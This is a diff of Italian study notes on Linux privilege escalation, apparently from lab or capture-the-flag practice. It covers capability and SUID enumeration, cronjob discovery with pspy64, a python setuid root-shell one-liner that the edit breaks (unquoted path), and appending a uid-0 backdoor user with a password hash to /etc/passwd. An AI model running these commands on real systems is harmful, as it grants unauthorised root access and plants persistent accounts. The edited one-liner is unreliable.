@@ -21,7 +21,7 @@
 	- `getcap -r / 2>/dev/null`
 		- cerca le capabilities dentro il sistema
 		- cerca la capability dentro `gtfobins`
-		- `python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'`
+		- `python -c 'import os; os.setuid(0); os.system(/bin/bash);'`
 - uso dei crontab
 	- `crontab -l`
 	- ti da la lista dei cronjob
@@ -30,10 +30,14 @@
 		- `-perm` filtra in base ai permessi
 	- `find / -perm /utente `
 	- così è possibile trovare un determinato file con suid
-		- con -p possiamo eseguire quel file con effective uid di quell'utente
+		- con -p possiamo eseguire quel file con effective `uid` di quell'utente
 		- se file non eseguibile `chmod a+x eseguibile`
 		- uso `pspy64` per vedere i cronjobs senza root
 
-creare un utente in passwd
+creare un utente in `/etc/passwd`
 `nome:passhash:0:0:/root:/bin/bash`
-
+- es: 
+	- per creare `passhash` uso `openssl passwd -1 AAA`
+	- in questa vulnerabilità dentro un file era presente una bash particolare, non ricordo come l'ho trovata ma ti permetteva di eseguire cose come utente `vdsi`
+- con `pspy64` è stato trovato un cronjob che ogni tot scriveva, ho messo che poteva fare append in `/etc/passwd`
+	- `echo 'sbers:$1$09SwDPRJ$cjx.ZcPD2r4WNXSKZVNPO1:0:0:/root:/bin/bash' >> /etc/passwd`
